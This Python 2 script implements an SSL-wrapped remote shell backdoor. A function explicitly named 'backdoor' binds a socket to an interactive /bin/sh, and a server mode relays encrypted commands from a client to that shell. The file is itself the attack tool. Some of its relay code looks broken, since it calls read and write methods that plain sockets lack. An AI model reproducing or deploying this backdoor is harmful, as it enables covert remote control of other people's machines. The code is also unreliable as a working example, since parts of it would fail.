#!/usr/bin/python
#coding=utf-8

import threading
import socket, ssl, pprint, time
import select
import os
import subprocess
from optparse import OptionParser
import StringIO

ca_crt_file = "ca.crt"
server_crt_file = "server.crt"
server_key_file = "server.key"

s_threads = []
c_threads = []

#
def backdoor(s):
	print "dup 0 1 2"
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p = subprocess.call("/bin/sh -i", shell=True);
	return p

def back_server():
	s = socket.socket()
	s.bind(('127.0.0.1', 8864))
	s.listen(1)
	conn, addr = s.accept()
	backdoor(conn)
	#s.close()
	return

def cmd_interlace(sc):
	back = socket.socket()
	back.connect(("127.0.0.1",8864))
	back.send("ls")
	print back.recv(1024)
	
	try:
		while 1:
			infds, outfds, errfds = select.select([sc,], [], [], 0)
			if len(infds):
				buf = sc.recv(4096)
				print "[+] " + buf
				back.write(buf)
				buf = back.read()
				print "[+] " + buf
				sc.send(buf)
	except:
		sc.close()
		return

def ssl_server(port, server_crt_file, server_key_file, ca_crt_file):
	s = socket.socket()
	s.bind(('', port))
	s.listen(5)

	try:
		while 1:
			conn, addr = s.accept()
			print "addr = " + str(addr)
			sc = ssl.wrap_socket(conn, server_side=True, certfile=server_crt_file, keyfile=server_key_file, ca_certs=ca_crt_file)

			pid = os.fork()
			if pid == 0:
				back_server()
			
			t = threading.Thread(target=cmd_interlace, args=(sc,))
			s_threads.append(t)
			t.setDaemon(True)
			t.start()

	except Exception as e:
		print "[!] " + str(e)
		return

def ssl_client(ip, port, ca_crt_file):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ss = ssl.wrap_socket(s, ca_certs=ca_crt_file, cert_reqs=ssl.CERT_REQUIRED)
	ss.connect((ip, port))
	
	ss.setblocking(0)
	print repr(ss.getpeername())
	print ss.cipher()
	print pprint.pformat(ss.getpeercert())

	try:
		while 1:
			ss.send(raw_input("#"))
			infds, outfds, errfds = select.select([ss,], [], [], 0.5)
				
			if ss in infds:
				print ss.recv(4096)

	except Exception as e:
		print "[!] " + str(e)
		ss.close()
		s.close()
		return


def main():
	MSG_USAGE = "myprog[-c][-s][-ccf <filename>][-scf <filename>][-skf <filename>] arg1[,arg2..]"
	optParser = OptionParser(MSG_USAGE)
	optParser.add_option("--ccf", "--ca_crt_file", default = "ca.crt", type="string", dest = "ca_crt_file")
	optParser.add_option("--scf", "--server_crt_file", default = "server.crt", type="string", dest = "server_crt_file")
	optParser.add_option("--skf", "--server_key_file", default = "server.key", type="string", dest = "server_key_file")
	optParser.add_option("-t", "--targetip", default = "127.0.0.1", type="string", dest = "ip")
	optParser.add_option("-p", "--port", default = "12345", type="string", dest = "port")
	optParser.add_option("-c", "--client", action = "store_false", default = False, dest = "sc_type")
	optParser.add_option("-s", "--server", action = "store_true", dest = "sc_type")
	
	options, args = optParser.parse_args()
	ca_crt_file = options.ca_crt_file
	server_crt_file = options.server_crt_file
	server_key_file = options.server_key_file
	sc_type = options.sc_type
	ip = options.ip
	port = options.port
	
	if sc_type:
		ssl_server(int(port), server_crt_file, server_key_file, ca_crt_file)
	else:
		ssl_client(ip, int(port), ca_crt_file)
	
if __name__ == "__main__":
	main()


